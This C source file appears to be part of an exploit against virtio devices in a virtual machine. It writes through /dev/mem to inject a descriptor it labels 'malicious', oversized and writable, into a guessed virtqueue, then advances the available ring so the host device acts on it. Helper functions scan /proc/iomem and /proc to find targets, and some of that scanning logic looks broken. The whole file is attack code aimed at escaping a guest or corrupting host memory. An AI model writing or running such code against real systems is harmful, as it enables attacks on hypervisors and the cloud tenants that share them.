#ifndef DESCRIPTOR_INJECTION_H
#define DESCRIPTOR_INJECTION_H

#include "virtio_structs.h"
#include <stdint.h>

// Function declarations
void inject_descriptor_with_avail_update(uintptr_t virtqueue_guest_phys_addr, int desc_index);
void locate_virtqueue_in_guest_ram(void);
void find_virtqueue_via_proc_maps(void);

#endif // DESCRIPTOR_INJECTION_H

// ===== IMPLEMENTATION =====

#include "descriptor_injection.h"
#include "buffer_management.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <dirent.h>
#include <errno.h>

void inject_descriptor_with_avail_update(uintptr_t virtqueue_guest_phys_addr, int desc_index) {
    printf("\n=== INJECTING DESCRIPTOR WITH AVAIL RING UPDATE ===\n");
    printf("Target virtqueue at guest physical: 0x%lx\n", virtqueue_guest_phys_addr);
    
    int mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("Cannot access /dev/mem: %s\n", strerror(errno));
        return;
    }
    
    size_t page_size = 4096;
    uintptr_t page_addr = virtqueue_guest_phys_addr & ~(page_size - 1);
    void *vq_mem = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, page_addr);
    
    if (vq_mem == MAP_FAILED) {
        printf("Failed to map virtqueue memory: %s\n", strerror(errno));
        close(mem_fd);
        return;
    }
    
    printf("Mapped virtqueue page at %p\n", vq_mem);
    
    size_t desc_offset = virtqueue_guest_phys_addr & (page_size - 1);
    struct virtq_desc *desc_table = (struct virtq_desc*)((char*)vq_mem + desc_offset);
    
    int queue_size = 256;  // Common queue size
    struct virtq_avail *avail = (struct virtq_avail*)(desc_table + queue_size);
    
    printf("Descriptor table: %p\n", desc_table);
    printf("Available ring: %p\n", avail);
    
    printf("Original descriptor at index %d:\n", desc_index);
    printf("  addr:  0x%016lx\n", desc_table[desc_index].addr);
    printf("  len:   %u\n", desc_table[desc_index].len);
    printf("  flags: 0x%04x\n", desc_table[desc_index].flags);
    
    struct virtq_desc malicious_desc = {
        .addr = (uint64_t)(uintptr_t)abuse_buf,
        .len = (uint32_t)abuse_len,
        .flags = VIRTQ_DESC_F_WRITE,
        .next = 0
    };
    
    printf("Injecting malicious descriptor:\n");
    printf("  addr:  0x%016lx (our abuse buffer)\n", malicious_desc.addr);
    printf("  len:   %u bytes (OVERSIZED!)\n", malicious_desc.len);
    printf("  flags: 0x%04x (WRITE)\n", malicious_desc.flags);
    
    // STEP 1: Inject the descriptor
    desc_table[desc_index] = malicious_desc;
    
    // STEP 2: Update available ring
    uint16_t current_idx = avail->idx;
    printf("Current avail->idx: %u\n", current_idx);
    
    avail->ring[current_idx % queue_size] = desc_index;
    
    __sync_synchronize();  // Memory barrier
    
    avail->idx = current_idx + 1;
    
    printf("DESCRIPTOR INJECTION COMPLETE!\n");
    printf("  - Malicious descriptor injected at index %d\n", desc_index);
    printf("  - Available ring updated: avail->ring[%u] = %d\n", current_idx % queue_size, desc_index);
    printf("  - Available index updated: %u -> %u\n", current_idx, current_idx + 1);
    printf("  - Device will see this descriptor when queue is kicked!\n");
    
    munmap(vq_mem, page_size);
    close(mem_fd);
}

void locate_virtqueue_in_guest_ram(void) {
    printf("\n=== LOCATING VIRTQUEUES IN GUEST RAM ===\n");
    
    FILE *iomem = fopen("/proc/iomem", "r");
    if (!iomem) {
        printf("Cannot read /proc/iomem\n");
        return;
    }
    
    char line[256];
    printf("Looking for DMA coherent memory regions:\n");
    
    while (fgets(line, sizeof(line), iomem)) {
        if (strstr(line, "dma-coherent") || strstr(line, "Reserved")) {
            printf("  %s", line);
            
            char *dash = strchr(line, '-');
            if (dash) {
                *dash = '\0';
                char *start_str = line;
                while (*start_str == ' ') start_str++;
                
                uintptr_t start_addr = strtoul(start_str, NULL, 16);
                
                if (start_addr > 0x1000000 && start_addr < 0x80000000) {
                    printf("    Potential virtqueue region at 0x%lx\n", start_addr);
                    inject_descriptor_with_avail_update(start_addr, 0);
                    break;  // Only try first promising region
                }
            }
        }
    }
    
    fclose(iomem);
}

void find_virtqueue_via_proc_maps(void) {
    printf("\n=== SCANNING /proc/*/maps FOR VIRTQUEUE ALLOCATIONS ===\n");
    
    DIR *proc_dir = opendir("/proc");
    if (!proc_dir) {
        printf("Cannot open /proc\n");
        return;
    }
    
    struct dirent *entry;
    while ((entry = readdir(proc_dir)) != NULL) {
        if (strstr(entry->d_name, "kthread") || 
            strstr(entry->d_name, "virtio") ||
            strstr(entry->d_name, "vhost")) {
            
            char maps_path[256];
            snprintf(maps_path, sizeof(maps_path), "/proc/%s/maps", entry->d_name);
            
            FILE *maps = fopen(maps_path, "r");
            if (maps) {
                char line[256];
                printf("Checking %s:\n", entry->d_name);
                
                while (fgets(line, sizeof(line), maps)) {
                    if (strstr(line, "[vdso]") || strstr(line, "[heap]")) {
                        printf("  %s", line);
                    }
                }
                fclose(maps);
            }
        }
    }
    
    closedir(proc_dir);
}